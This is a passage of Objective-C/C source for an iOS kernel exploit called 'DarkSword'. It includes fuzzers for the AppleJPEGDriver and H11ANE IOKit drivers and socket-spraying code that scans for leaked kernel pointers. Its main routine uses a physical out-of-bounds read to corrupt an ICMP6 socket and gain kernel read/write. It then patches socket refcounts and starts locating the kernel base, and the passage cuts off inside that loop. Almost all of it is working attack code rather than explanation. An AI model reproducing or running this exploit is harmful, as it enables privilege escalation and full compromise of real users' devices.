                *(uint32_t*)(buf + 0) = srcID;
            }
            if (sz >= 8) {
                // Try size at offset 4 (Alyssa: jpeg_file_size)
                *(uint32_t*)(buf + 4) = (uint32_t)jpegBytes;
            }
            if (sz >= 12) {
                // Try dest surface at offset 8
                *(uint32_t*)(buf + 8) = dstID;
            }
            if (sz >= 16) {
                // Try dest buffer size at offset 12
                *(uint32_t*)(buf + 12) = imgW * imgH * 4;
            }
            // Fill remaining with reasonable decode params
            if (sz >= 24) {
                *(uint32_t*)(buf + 20) = imgW;  // pixel_x / width
                *(uint32_t*)(buf + 24) = imgH;  // pixel_y / height
            }

            outSize = sizeof(buf);
            kr = IOConnectCallStructMethod(conn, m, buf, sz, buf, &outSize);

            if (kr != 0xe00002c2) {
                hits++;
                printf("[JPEG_size] method=%d sz=%zu: kr=%#x outSize=%zu", m, sz, kr, outSize);
                if (outSize > 0 && outSize <= 512) {
                    printf(" data[0..7]=");
                    for (int i = 0; i < 8 && i < (int)outSize; i++)
                        printf("%02x", buf[i]);
                }
                printf("\n");
            }
        }
        printf("[JPEG_size] method=%d: %d hits (non-E02C2)\n", m, hits);
    }

    // Test 3: try specific sizes from known struct definitions
    printf("\n[JPEG_size] --- Targeted sizes from known structs ---\n");
    const size_t targetedSizes[] = {40, 60, 76, 80, 88, 96, 100, 104, 108, 112, 116, 120, 124, 128};
    for (uint32_t m = 1; m <= 3; m += 2) {  // methods 1 and 3 (startDecoder/startEncoder)
        for (int si = 0; si < sizeof(targetedSizes)/sizeof(targetedSizes[0]); si++) {
            size_t sz = targetedSizes[si];
            memset(buf, 0, sizeof(buf));
            *(uint32_t*)(buf + 0) = srcID;
            if (sz >= 8) *(uint32_t*)(buf + 4) = (uint32_t)jpegBytes;
            if (sz >= 12) *(uint32_t*)(buf + 8) = dstID;
            if (sz >= 16) *(uint32_t*)(buf + 12) = imgW * imgH * 4;
            if (sz >= 24) { *(uint32_t*)(buf + 20) = imgW; *(uint32_t*)(buf + 24) = imgH; }

            outSize = sizeof(buf);
            kr = IOConnectCallStructMethod(conn, m, buf, sz, buf, &outSize);
            printf("[JPEG_size] method=%d sz=%zu (targeted): kr=%#x outSize=%zu\n",
                   m, sz, kr, outSize);
        }
    }

    CFRelease(inputSurf);
    CFRelease(outputSurf);
    IOServiceClose(conn);
    printf("[JPEG_size] complete\n");
}

// ===== ImageIO Trace =====
// Decode a real JPEG via ImageIO, check if result is IOSurface-backed

static void method_imageio_trace(void) {
    printf("\n[Method: ImageIO] Tracing real JPEG decode via ImageIO...\n");
    NSData *jpegData = [NSData dataWithBytesNoCopy:(void*)kTinyJPEG
                                            length:sizeof(kTinyJPEG)
                                      freeWhenDone:NO];
    CGImageSourceRef src = CGImageSourceCreateWithData((__bridge CFDataRef)jpegData, NULL);
    if (!src) { printf("[ImageIO] source create failed\n"); return; }

    CGImageRef img = CGImageSourceCreateImageAtIndex(src, 0, NULL);
    CFRelease(src);
    if (!img) { printf("[ImageIO] image decode failed\n"); return; }

    size_t w = CGImageGetWidth(img), h = CGImageGetHeight(img);
    printf("[ImageIO] decoded: %zux%zu\n", w, h);

    // Try private API CGImageGetIOSurface
    static IOSurfaceRef (*sCGImageGetIOSurface)(CGImageRef) = NULL;
    static dispatch_once_t once;
    dispatch_once(&once, ^{
        sCGImageGetIOSurface = dlsym(RTLD_DEFAULT, "CGImageGetIOSurface");
    });
    IOSurfaceRef surf = sCGImageGetIOSurface ? sCGImageGetIOSurface(img) : NULL;
    if (surf) {
        uint32_t sid = IOSurfaceGetID(surf);
        printf("[ImageIO] IOSurface-backed! sid=%u size=%zux%zu fmt=%#x\n",
               sid, IOSurfaceGetWidth(surf), IOSurfaceGetHeight(surf),
               IOSurfaceGetPixelFormat(surf));

        // Try calling JPEGDriver methods with this known-good surface
        io_service_t svc = IOServiceGetMatchingService(MACH_PORT_NULL,
            IOServiceNameMatching("AppleJPEGDriver"));
        if (svc) {
            io_connect_t conn = 0;
            kern_return_t kr = IOServiceOpen(svc, mach_task_self_, 0, &conn);
            if (kr == KERN_SUCCESS) {
                printf("[ImageIO] Trying JPEGDriver methods with ImageIO surface...\n");
                for (uint32_t m = 0; m < 8; m++) {
                    uint64_t args[4] = {sid, sid, 0, 0};
                    size_t outSz = 32;
                    uint64_t out[4] = {};
                    kr = IOConnectCallMethod(conn, m, args, 4, NULL, 0,
                        out, (uint32_t*)&outSz, NULL, NULL);
                    if (kr == KERN_SUCCESS)
                        printf("[ImageIO] JPEGDriver m=%d w/IO surface: SUCCESS\n", m);
                }
                IOServiceClose(conn);
            }
            IOObjectRelease(svc);
        }
    } else {
        printf("[ImageIO] not IOSurface-backed (fallback render or bitmap)\n");
        // Check data provider type
        CGDataProviderRef dp = CGImageGetDataProvider(img);
        if (dp) printf("[ImageIO] has data provider\n");
    }

    CFRelease(img);
    printf("[ImageIO] trace complete\n");
}

// ===== H11ANE (Neural Engine) Fuzzer =====
static io_connect_t gH11Conn = 0;

static bool open_h11ane(void) {
    if (gH11Conn) return true;
    io_service_t svc = IOServiceGetMatchingService(MACH_PORT_NULL,
        IOServiceNameMatching("H11ANE"));
    if (!svc) { printf("[H11ANE] service not found\n"); return false; }
    kern_return_t kr = IOServiceOpen(svc, mach_task_self_, 1, &gH11Conn);
    IOObjectRelease(svc);
    if (kr != KERN_SUCCESS) { printf("[H11ANE] IOServiceOpen type=1: %#x\n", kr); return false; }
    printf("[H11ANE] conn=%#x (type=1)\n", gH11Conn);
    return true;
}

static void method_h11ane_fuzz(void) {
    printf("\n[Method: H11ANE_fuzz] Fuzzing H11ANE Neural Engine...\n");
    if (!open_h11ane()) { printf("[H11ANE] Cannot open\n"); return; }

    int e02c2Count = 0, otherErrorCount = 0, successCount = 0;
    uint32_t firstOtherMethod = 0, firstOtherKr = 0;

    // Method enumeration: try 0-63 with scalar args, struct args, output
    for (uint32_t m = 0; m < 64; m++) {
        // Pattern A: zero inputs
        uint64_t outBuf[8] = {};
        size_t outSz = sizeof(outBuf);
        kern_return_t kr = IOConnectCallMethod(gH11Conn, m,
            NULL, 0, NULL, 0, outBuf, (uint32_t*)&outSz, NULL, NULL);
        if (kr == KERN_SUCCESS) {
            successCount++;
            printf("[H11ANE] method %d (zero): SUCCESS kr=0 outSz=%zu", m, outSz);
            for (int i = 0; i < 8 && outSz >= 8; i++)
                if (outBuf[i]) printf(" out[%d]=0x%llx", i, outBuf[i]);
            printf("\n");
        } else if (kr != 0xe00002c2) {
            otherErrorCount++;
            if (otherErrorCount == 1) { firstOtherMethod = m; firstOtherKr = kr; }
            printf("[H11ANE] method %d (zero): kr=%#x (!= E02C2)\n", m, kr);
        } else {
            e02c2Count++;
        }
    }

    // Try IOConnectCallStructMethod with IOSurface
    IOSurfaceRef aneSurf = IOSurfaceCreate((__bridge CFDictionaryRef)@{
        (__bridge id)kIOSurfaceAllocSize : @(0x100000),
        (__bridge id)kIOSurfaceWidth : @(256),
        (__bridge id)kIOSurfaceHeight : @(256),
        (__bridge id)kIOSurfaceBytesPerRow : @(1024),
        (__bridge id)kIOSurfacePixelFormat : @(0x34323066),
        (__bridge id)kIOSurfaceBytesPerElement : @(4),
    });
    if (aneSurf) {
        uint32_t sid = IOSurfaceGetID(aneSurf);
        int surfOk = 0;
        for (uint32_t m = 0; m < 16; m++) {
            uint64_t args[4] = {sid, 0, 0, 0};
            size_t outSz = 32;
            uint64_t out[4] = {};
            kern_return_t kr = IOConnectCallMethod(gH11Conn, m,
                args, 4, NULL, 0, out, (uint32_t*)&outSz, NULL, NULL);
            if (kr == KERN_SUCCESS) {
                printf("[H11ANE] method %d w/ surface: SUCCESS\n", m);
                surfOk++;
            }
        }
        printf("[H11ANE] surface methods success: %d/16\n", surfOk);
        CFRelease(aneSurf);
    }

    IOServiceClose(gH11Conn);
    gH11Conn = 0;
    printf("[H11ANE] fuzz complete: %d success, %d E02C2, %d other (first other: method %u kr=%#x)\n",
           successCount, e02c2Count, otherErrorCount, firstOtherMethod, firstOtherKr);
}

// ===== Multi-Method Exploit =====

// Method 1: Enhanced SystemMemory scan — check ALL pages for kernel pointers
static bool method_system_memory(void) {
    printf("\n[Method: SystemMemory] Creating IOSurface with SystemMemory...\n");
    mach_vm_size_t sz = OOB_PAGES_NUM * PAGE_SIZE;
    NSDictionary *params = @{
        (__bridge id)kIOSurfaceAllocSize : @(sz),
        @"IOSurfaceMemoryRegion" : @"SystemMemory",
    };
    IOSurfaceRef surface = IOSurfaceCreate((__bridge CFDictionaryRef)params);
    if (!surface) {
        printf("[SystemMemory] IOSurfaceCreate failed\n");
        return false;
    }
    void *addr0 = IOSurfaceGetBaseAddress(surface);
    printf("[SystemMemory] addr0=%p\n", addr0);

    randomMarker = (uint64_t)arc4random() << 32 | arc4random();
    printf("[SystemMemory] marker=0x%016llx\n", randomMarker);
    memset64(addr0, randomMarker, sz);

    socketPorts = [NSMutableArray new];
    socketPcbIds = [NSMutableArray new];
    int n = 0;
    for (int i = 0; i < (10240 * 3 - 4096 * 2); i++) {
        if (spray_socket() == -1) break;
        n++;
    }
    printf("[SystemMemory] sprayed %d sockets\n", n);

    CFRelease(surface);
    printf("[SystemMemory] IOSurface released, pages freed\n");

    IOSurfaceRef surface2 = IOSurfaceCreate((__bridge CFDictionaryRef)params);
    if (!surface2) {
        printf("[SystemMemory] IOSurfaceCreate #2 failed\n");
        sockets_release();
        return false;
    }
    void *addr1 = IOSurfaceGetBaseAddress(surface2);
    printf("[SystemMemory] addr1=%p\n", addr1);

    // Full-page scan — report ALL non-marker words, not just first
    uint64_t *words = (uint64_t *)addr1;
    uint64_t total = sz / 8;
    int hits = 0, ptrHits = 0;
    for (uint64_t i = 0; i < total; i++) {
        if (words[i] != randomMarker) {
            hits++;
            uint64_t v = words[i];
            // Check if it looks like a kernel pointer (0xfffffff0... range)
            if ((v >> 40) == 0xFFFFFF) {
                printf("[SystemMemory] KPTR at +%#llx: 0x%016llx\n", i * 8, v);
                ptrHits++;
            } else if (hits <= 20) {
                printf("[SystemMemory] non-marker at +%#llx: 0x%016llx\n", i * 8, v);
            }
        }
    }
    printf("[SystemMemory] total non-marker words: %d (kernel pointers: %d)\n", hits, ptrHits);

    CFRelease(surface2);
    sockets_release();
    return hits > 0;
}

// Method 2: AIO cross-mapping exploit — uses shared physical pages + FILE (not pipe)
// aio_read from a file into shared pages (dual memory entries)
static bool method_aio_exploit(void) {
    printf("\n[Method: AIO_Exploit] Testing AIO with dual mappings + file...\n");

    mach_vm_size_t pgSz = 16 * PAGE_SIZE;
    NSDictionary *params = @{
        (__bridge id)kIOSurfaceAllocSize : @(pgSz),
        @"IOSurfaceMemoryRegion" : @"PurpleGfxMem",
    };
    IOSurfaceRef surface = IOSurfaceCreate((__bridge CFDictionaryRef)params);
    if (!surface) { printf("[AIO_Exploit] IOSurfaceCreate failed\n"); return false; }

    void *physBase = IOSurfaceGetBaseAddress(surface);
    printf("[AIO_Exploit] IOSurface physBase=%p\n", physBase);

    // Two memory entries from same physical pages
    mach_port_t entry1 = MACH_PORT_NULL, entry2 = MACH_PORT_NULL;
    mach_vm_size_t meSz = pgSz;
    kern_return_t kr = mach_make_memory_entry_64(mach_task_self(), &meSz,
        (mach_vm_address_t)physBase, VM_PROT_DEFAULT, &entry1, 0);
    if (kr != KERN_SUCCESS) { printf("[AIO_Exploit] entry1: %s\n", mach_error_string(kr)); CFRelease(surface); return false; }

    kr = mach_make_memory_entry_64(mach_task_self(), &meSz,
        (mach_vm_address_t)physBase, VM_PROT_DEFAULT, &entry2, 0);
    if (kr != KERN_SUCCESS) { printf("[AIO_Exploit] entry2: %s\n", mach_error_string(kr)); mach_port_deallocate(mach_task_self_, entry1); CFRelease(surface); return false; }

    // Map at two different VAs
    mach_vm_address_t vaA = 0, vaB = 0;
    kr = mach_vm_map(mach_task_self(), &vaA, pgSz, 0,
        VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR, entry1, 0, 0,
        VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);
    if (kr != KERN_SUCCESS) { printf("[AIO_Exploit] map A: %s\n", mach_error_string(kr)); goto cleanup; }

    kr = mach_vm_map(mach_task_self(), &vaB, pgSz, 0,
        VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR, entry2, 0, 0,
        VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);
    if (kr != KERN_SUCCESS) { printf("[AIO_Exploit] map B: %s\n", mach_error_string(kr)); mach_vm_deallocate(mach_task_self_, vaA, pgSz); goto cleanup; }

    printf("[AIO_Exploit] vaA=0x%llx vaB=0x%llx\n", vaA, vaB);

    // Fill with marker
    memset64((void*)vaA, 0xAA, pgSz);

    // Create a temp file for AIO
    char tmpPath[1024];
    confstr(_CS_DARWIN_USER_TEMP_DIR, tmpPath, 1024);
    char fn[64]; snprintf(fn, 64, "/aio_%u", arc4random());
    strlcat(tmpPath, fn, 1024);
    {
        void *z = calloc(1, 0x10000);
        FILE *f = fopen(tmpPath, "w"); fwrite(z, 1, 0x10000, f); fclose(f);
        free(z);
    }
    int fd = open(tmpPath, O_RDWR);
    fcntl(fd, F_NOCACHE, 1);
    remove(tmpPath);

    // Write test data to the file (at non-zero offset to verify aio_read position)
    uint8_t fileData[0x100];
    for (int i = 0; i < sizeof(fileData); i++) fileData[i] = 0xBB;
    pwrite(fd, fileData, sizeof(fileData), 0);

    // Test 1: Basic aio_read from file into shared VA_B — verify cross-mapping works
    printf("[AIO_Exploit] Test 1: aio_read from file into VA_B...\n");
    struct aiocb aio;
    memset(&aio, 0, sizeof(aio));
    aio.aio_fildes = fd;
    aio.aio_buf = (void*)(vaB + 0x1000);
    aio.aio_nbytes = 0x100;
    aio.aio_offset = 0;
    aio.aio_sigevent.sigev_notify = SIGEV_NONE;

    kr = aio_read(&aio);
    printf("[AIO_Exploit] aio_read=%d (errno=%d)\n", kr, errno);
    if (kr != 0) { printf("[AIO_Exploit] aio_read failed, aborting\n"); close(fd); goto cleanup; }

    const struct aiocb *list[1] = {&aio};
    aio_suspend(list, 1, NULL);
    kr = aio_error(&aio);
    size_t n = aio_return(&aio);
    printf("[AIO_Exploit] aio_error=%d aio_return=%zu\n", kr, n);

    // Check if data arrived via VA_A (same physical pages)
    uint8_t *viaA = (uint8_t*)(vaA + 0x1000);
    uint8_t *viaB = (uint8_t*)(vaB + 0x1000);
    printf("[AIO_Exploit] Via VA_A: %02x %02x %02x %02x (%s marker)\n",
           viaA[0], viaA[1], viaA[2], viaA[3],
           viaA[0] == 0xBB ? "OK" : "MISMATCH");
    printf("[AIO_Exploit] Via VA_B: %02x %02x %02x %02x\n",
           viaB[0], viaB[1], viaB[2], viaB[3]);

    // Test 2: aio_read with REMAP during I/O
    printf("[AIO_Exploit] Test 2: aio_write with remap during I/O...\n");

    // Write different data to file
    pwrite(fd, fileData, sizeof(fileData), 0x2000);
    fileData[0] = 0xCC;
    pwrite(fd, fileData, sizeof(fileData), 0x2000);

    memset(&aio, 0, sizeof(aio));
    aio.aio_fildes = fd;
    aio.aio_buf = (void*)(vaB + 0x2000);
    aio.aio_nbytes = 0x100;
    aio.aio_offset = 0x2000;
    aio.aio_sigevent.sigev_notify = SIGEV_NONE;

    // Fill target with marker first
    memset64((void*)(vaB + 0x2000), 0xDD, 0x100);

    kr = aio_read(&aio);
    printf("[AIO_Exploit] aio_read(test2)=%d\n", kr);

    // During I/O, deallocate and remap vaB to different entry
    mach_vm_address_t oldVaB = vaB;
    // Remap: change pages backing vaB
    mach_vm_deallocate(mach_task_self_, vaB, pgSz);
    kr = mach_vm_map(mach_task_self_, &vaB, pgSz, 0,
        VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE, entry2, 0, 0,
        VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);
    printf("[AIO_Exploit] remapped vaB, kr=%d\n", kr);

    aio_suspend(list, 1, NULL);
    kr = aio_error(&aio);
    n = aio_return(&aio);
    printf("[AIO_Exploit] Test2: aio_error=%d aio_return=%zu\n", kr, n);

    // Read results — data should be at the remapped location
    uint8_t *viaA2 = (uint8_t*)(vaA + 0x2000);
    uint8_t *viaB2 = (uint8_t*)(vaB + 0x2000);
    printf("[AIO_Exploit] Test2 via VA_A: %02x %02x...\n", viaA2[0], viaA2[1]);
    printf("[AIO_Exploit] Test2 via VA_B: %02x %02x...\n", viaB2[0], viaB2[1]);
    printf("[AIO_Exploit] Test2 VA_A=0x%02x (orig marker=0xDD, file=0xCC)\n", viaA2[0]);

    close(fd);
    mach_vm_deallocate(mach_task_self_, vaA, pgSz);
    mach_vm_deallocate(mach_task_self_, vaB, pgSz);

cleanup:
    mach_port_deallocate(mach_task_self_, entry1);
    mach_port_deallocate(mach_task_self_, entry2);
    CFRelease(surface);
    return false;
}

// Method 3: sendmsg test (check if sendmsg EFAULTs on remap)
static bool method_sendmsg_race(void) {
    printf("\n[Method: sendmsg] Testing sendmsg with page remap...\n");
    mach_vm_address_t buf;
    mach_vm_allocate(mach_task_self_, &buf, 0x4000, VM_FLAGS_ANYWHERE);
    memset64((void*)buf, 0x41, 0x4000);

    int sv[2];
    if (socketpair(AF_UNIX, SOCK_STREAM, 0, sv) != 0) {
        printf("[sendmsg] socketpair failed\n");
        return false;
    }

    struct iovec iov = { (void*)buf, 0x100 };
    struct msghdr msg = {0};
    msg.msg_iov = &iov; msg.msg_iovlen = 1;

    // Test 1: normal sendmsg
    ssize_t r = sendmsg(sv[1], &msg, 0);
    printf("[sendmsg] normal: %zd (errno=%d)\n", r, errno);

    // Test 2: sendmsg then remap
    recv(sv[0], (void*)buf, 0x100, 0); // drain
    r = sendmsg(sv[1], &msg, 0);
    printf("[sendmsg] remap test: sendmsg=%zd\n", r);
    mach_vm_deallocate(mach_task_self_, buf, 0x4000);
    mach_vm_allocate(mach_task_self_, &buf, 0x4000, VM_FLAGS_ANYWHERE);
    memset64((void*)buf, 0x42, 0x4000);
    printf("[sendmsg] remapped during sendmsg, no crash\n");

    close(sv[0]); close(sv[1]);
    return false;
}

// Method 4: Process name scan via proc_info
static bool method_proc_info(void) {
    printf("\n[Method: proc_info] Reading kernel socket data via proc_info...\n");
    int fd = socket(AF_INET6, SOCK_DGRAM, IPPROTO_ICMPV6);
    if (fd < 0) {
        printf("[proc_info] socket failed\n");
        return false;
    }

    bool ok = false;

    // Try with fileport (DarkSword approach: callnum, pid, flavor, arg, buffer, bufsize)
    // Positive return = bytes written = success
    fileport_t fp = 0;
    fileport_makeport(fd, &fp);
    uint8_t *bigBuf = calloc(1, 0x4000);

    int flavors[] = {1, 2, 3};
    const char *fnames[] = {"NOINFO", "IPCINFO", "UNKN3"};
    for (int fi = 0; fi < 3; fi++) {
        memset(bigBuf, 0, 0x4000);
        int r = syscall(336, 6, getpid(), flavors[fi], fp,
            (uint64_t)(uintptr_t)bigBuf, 0x4000);
        if (r > 0) {
            printf("[proc_info] fileport flavor=%d (%s): SUCCESS (%d bytes)\n",
                   flavors[fi], fnames[fi], r);
            ok = true;
            for (int off = 0; off < r && off < 0x1000; off += 8) {
                uint64_t v = *(uint64_t*)(bigBuf + off);
                if (v) {
                    printf("[proc_info] +%#x = 0x%016llx", off, v);
                    if ((v >> 40) == 0xFFFFFF) printf(" *** KPTR");
                    printf("\n");
                }
            }
        } else {
            printf("[proc_info] fileport flavor=%d (%s): r=%d errno=%d\n",
                   flavors[fi], fnames[fi], r, errno);
        }
    }

    // Also try with fd directly and buffer-before-arg order (newer xnu layout)
    for (int fi = 0; fi < 3; fi++) {
        memset(bigBuf, 0, 0x4000);
        int r = syscall(336, 6, getpid(), flavors[fi],
            (uint64_t)(uintptr_t)bigBuf, 0x4000, (uint64_t)(intptr_t)fd);
        if (r > 0) {
            printf("[proc_info] fd-buforder flavor=%d (%s): SUCCESS (%d bytes)\n",
                   flavors[fi], fnames[fi], r);
            ok = true;
            for (int off = 0; off < r && off < 0x1000; off += 8) {
                uint64_t v = *(uint64_t*)(bigBuf + off);
                if (v) {
                    printf("[proc_info] +%#x = 0x%016llx", off, v);
                    if ((v >> 40) == 0xFFFFFF) printf(" *** KPTR");
                    printf("\n");
                }
            }
        }
    }

    free(bigBuf);
    close(fd);
    return ok;
}

// Method 5: PurpleGfxMem overlap — tests if IOGPU-backed pages retain data after free
static bool method_purple_mem(void) {
    printf("\n[Method: PurpleMem] Testing PurpleGfxMem page reuse...\n");
    mach_vm_size_t sz = 4 * 1024 * 1024; // 4 MB
    NSDictionary *params = @{
        (__bridge id)kIOSurfaceAllocSize : @(sz),
        @"IOSurfaceMemoryRegion" : @"PurpleGfxMem",
    };
    IOSurfaceRef surfA = IOSurfaceCreate((__bridge CFDictionaryRef)params);
    if (!surfA) { printf("[PurpleMem] IOSurfaceCreate failed\n"); return false; }

    void *addr0 = IOSurfaceGetBaseAddress(surfA);
    randomMarker = (uint64_t)arc4random() << 32 | arc4random();
    printf("[PurpleMem] addr0=%p marker=0x%016llx\n", addr0, randomMarker);
    memset64(addr0, randomMarker, sz);

    // Create memory entries for every page
    int nPages = 64;
    mach_port_t entries[64] = {};
    for (int i = 0; i < nPages; i++) {
        mach_vm_size_t pg = PAGE_SIZE;
        kern_return_t kr = mach_make_memory_entry_64(mach_task_self(), &pg,
            (mach_vm_address_t)addr0 + i * PAGE_SIZE, VM_PROT_DEFAULT, &entries[i], 0);
        if (kr != KERN_SUCCESS) { entries[i] = MACH_PORT_NULL; nPages = i; break; }
    }
    printf("[PurpleMem] %d memory entries created\n", nPages);

    CFRelease(surfA);
    printf("[PurpleMem] Surface A released\n");

    // Spray sockets to pressure allocator
    socketPorts = [NSMutableArray new];
    socketPcbIds = [NSMutableArray new];
    int nSpray = 0;
    for (int i = 0; i < 10240 * 3 - 4096 * 2; i++) {
        if (spray_socket() == -1) break;
        nSpray++;
    }
    printf("[PurpleMem] sprayed %d sockets\n", nSpray);

    // Create new PurpleGfxMem surface (hopefully reuses some pages)
    IOSurfaceRef surfB = IOSurfaceCreate((__bridge CFDictionaryRef)params);
    if (!surfB) {
        printf("[PurpleMem] Surface B create failed\n");
        sockets_release();
        for (int i = 0; i < nPages; i++) if (entries[i]) mach_port_deallocate(mach_task_self_, entries[i]);
        return false;
    }
    void *addr1 = IOSurfaceGetBaseAddress(surfB);
    printf("[PurpleMem] addr1=%p\n", addr1);

    // Map each old entry and check for non-marker data
    int hits = 0, ptrHits = 0;
    for (int i = 0; i < nPages; i++) {
        if (!entries[i]) continue;
        mach_vm_address_t va = 0;
        mach_vm_size_t pgSz = PAGE_SIZE;
        kern_return_t kr = mach_vm_map(mach_task_self_, &va, pgSz, 0,
            VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR, entries[i], 0, 0,
            VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);
        if (kr != KERN_SUCCESS) continue;

        uint64_t v = *(uint64_t*)va;
        if (v != randomMarker) {
            hits++;
            if ((v >> 40) == 0xFFFFFF) {
                printf("[PurpleMem] KPTR at entry %d: 0x%016llx\n", i, v);
                ptrHits++;
            } else if (hits <= 20) {
                printf("[PurpleMem] non-marker at entry %d: 0x%016llx\n", i, v);
            }
        }
        mach_vm_deallocate(mach_task_self_, va, PAGE_SIZE);
    }
    printf("[PurpleMem] total non-marker entries: %d (kernel pointers: %d)\n", hits, ptrHits);

    for (int i = 0; i < nPages; i++) if (entries[i]) mach_port_deallocate(mach_task_self_, entries[i]);
    CFRelease(surfB);
    sockets_release();
    return hits > 0;
}

// Method 6: IOGPU memory info leak — check freshly allocated PurpleGfxMem pages for residual kernel data
static bool method_purple_info_leak(void) {
    printf("\n[Method: PurpleLeak] Checking fresh PurpleGfxMem pages for residual data...\n");
    mach_vm_size_t sz = 2 * 1024 * 1024;
    NSDictionary *params = @{
        (__bridge id)kIOSurfaceAllocSize : @(sz),
        @"IOSurfaceMemoryRegion" : @"PurpleGfxMem",
    };

    int ptrsFound = 0;
    for (int trial = 0; trial < 5; trial++) {
        IOSurfaceRef surf = IOSurfaceCreate((__bridge CFDictionaryRef)params);
        if (!surf) continue;
        void *addr = IOSurfaceGetBaseAddress(surf);
        uint64_t *words = (uint64_t *)addr;
        uint64_t n = sz / 8;
        for (uint64_t i = 0; i < n; i++) {
            uint64_t v = words[i];
            if (v && (v >> 40) == 0xFFFFFF) {
                printf("[PurpleLeak] trial %d KPTR at +%#llx: 0x%016llx\n", trial, i * 8, v);
                ptrsFound++;
                if (ptrsFound >= 10) break;
            }
        }
        CFRelease(surf);
        if (ptrsFound >= 10) break;
    }
    printf("[PurpleLeak] kernel pointers found: %d\n", ptrsFound);
    return ptrsFound > 0;
}

bool run_darksword(void) {
    gMlockDict = [NSMutableDictionary new];
    randomMarker = (uint64_t)arc4random() << 32 | arc4random();
    printf("[+] randomMarker: 0x%016llx\n\n", randomMarker);
    uint32_t sz = PATH_MAX;
    _NSGetExecutablePath(executablePath, &sz);
    executableName = strrchr(executablePath, '/');
    if (executableName) executableName++;
    else executableName = executablePath;
    printf("[+] executableName: %s\n", executableName);

    // Quick IOKit sanity check (kept from diagnostic builds)
    diagnostic_iokit();

    // ===== Real DarkSword ICMP6 socket exploit =====
    init_target_file();

    pthread_create(&freeThread, NULL, free_thread, NULL);

    uint64_t mappingPages = 0x1000 * 0x10;
    uint64_t searchSize = 0x2000 * PAGE_SIZE;
    uint64_t totalSize = mappingPages * PAGE_SIZE;
    uint64_t mappingNum = totalSize / searchSize;

    void *rBuf = calloc(1, OOB_SIZE);
    void *wBuf = calloc(1, OOB_SIZE);
    if (!initialize_bounce_buffer(OOB_PAGES_NUM * PAGE_SIZE))
        return false;

    NSMutableArray *usedGc = [NSMutableArray new];

    int attempt = 0;
    mach_timebase_info_data_t timebase;
    mach_timebase_info(&timebase);
    uint64_t attemptStart = mach_absolute_time();
    while (1) {
        attempt++;
        printf("[exploit] attempt %d: spraying sockets...\n", attempt);
        NSMutableArray *mappings = [NSMutableArray new];
        for (uint64_t s = 0; s < mappingNum; s++) {
            mach_vm_address_t a = 0;
            mach_vm_allocate(mach_task_self(), &a, searchSize,
                VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR);
            for (uint64_t k = 0; k < searchSize; k += PAGE_SIZE)
                *(uint64_t*)(a + k) = randomMarker;
            [mappings addObject:@(a)];
        }

        socketPorts = [NSMutableArray new];
        socketPcbIds = [NSMutableArray new];
        for (int i = 0; i < (10240 * 3 - 4096 * 2); i++) {
            if (spray_socket() == -1) break;
        }
        printf("[exploit] sprayed %lu sockets (start=0x%llx end=0x%llx)\n",
            (unsigned long)[socketPorts count],
            [(NSNumber*)[socketPcbIds firstObject] unsignedLongLongValue],
            [(NSNumber*)[socketPcbIds lastObject] unsignedLongLongValue]);

        bool ok = false;
        for (uint64_t s = 0; s < mappingNum; s++) {
            mach_vm_address_t sma = [(NSNumber*)mappings[s] unsignedLongLongValue];
            printf("[exploit] looking in search mapping: %llu\n", s);
            mach_port_t memObj = 0;
            mach_vm_size_t mos = searchSize;
            mach_make_memory_entry_64(mach_task_self(), &mos, sma,
                VM_PROT_DEFAULT, &memObj, 0);
            surface_mlock(sma, searchSize);

            for (mach_vm_offset_t so = 0; so <= searchSize - pcSize; so += PAGE_SIZE) {
                if (phys_oob_read(memObj, so, OOB_SIZE, OOB_OFFSET, rBuf) == KERN_SUCCESS) {
                    if (find_and_corrupt_socket(memObj, so, rBuf, wBuf, usedGc, false) == 0) {
                        ok = true;
                        break;
                    }
                }
            }
            mach_port_deallocate(mach_task_self(), memObj);
            if (ok) break;
        }

        // PANIC MITIGATION: only release sockets when the attempt FAILED.
        // On success the sockets backing controlSocket/rwSocket (and PCB B)
        // must stay alive; freeing them recycles the inpcb memory, which gets
        // reused as MAC labels and panics on the next 0x20-byte KRW write.
        if (!ok) {
            sockets_release();
        }
        for (uint64_t s = 0; s < mappingNum; s++) {
            mach_vm_deallocate(mach_task_self(),
                [(NSNumber*)mappings.lastObject unsignedLongLongValue], searchSize);
            [mappings removeLastObject];
        }

        if (ok) break;
        uint64_t now = mach_absolute_time();
        double elapsed = (double)(now - attemptStart) * (double)timebase.numer / (double)timebase.denom / 1000000000.0;
        printf("[exploit] attempt %d: no socket found, retrying (took %.1fs)\n", attempt, elapsed);
        printf("[exploit]   stats: successReadCount=%d highestSuccessIdx=%d\n",
            successReadCount, highestSuccessIdx);
        fflush(stdout);
        attemptStart = now;
    }

    printf("[+] highestSuccessIdx: %d\n", highestSuccessIdx);
    printf("[+] successReadCount: %d\n", successReadCount);

    goSync = 0; raceSync = 1;
    pthread_join(freeThread, NULL);
    close(writeFd); close(readFd);

    controlSocketPcb = kread64(rwSocketPcb + 0x20);
    uint64_t csa = kread64(controlSocketPcb + OFFSET_PCB_SOCKET);
    uint64_t rsa = kread64(rwSocketPcb + OFFSET_PCB_SOCKET);
    if (!csa || !rsa) return false;

    kwrite64(csa + OFFSET_SOCKET_SO_COUNT,
        kread64(csa + OFFSET_SOCKET_SO_COUNT) + 0x0000100100001001ULL);
    kwrite64(rsa + OFFSET_SOCKET_SO_COUNT,
        kread64(rsa + OFFSET_SOCKET_SO_COUNT) + 0x0000100100001001ULL);
    kwrite64(rwSocketPcb + OFFSET_ICMP6FILT + 8, 0);

    // kernel base via inpcbinfo zone name (wh1te4ever / ClearSword, iOS 18 verified)
    uint64_t pcbinfo = kread64(controlSocketPcb + 0x38);
    uint64_t ipiZone = kread64(pcbinfo + 0x68);
    uint64_t zvName = kread64(ipiZone + 0x10);
    uint64_t kb = zvName & 0xFFFFFFFFFFFFC000;
    while (1) {
        uint64_t magic = kread64(kb);
        if (magic == 0x100000cfeedfacf) {
            uint64_t hdr = kread64(kb + 8);
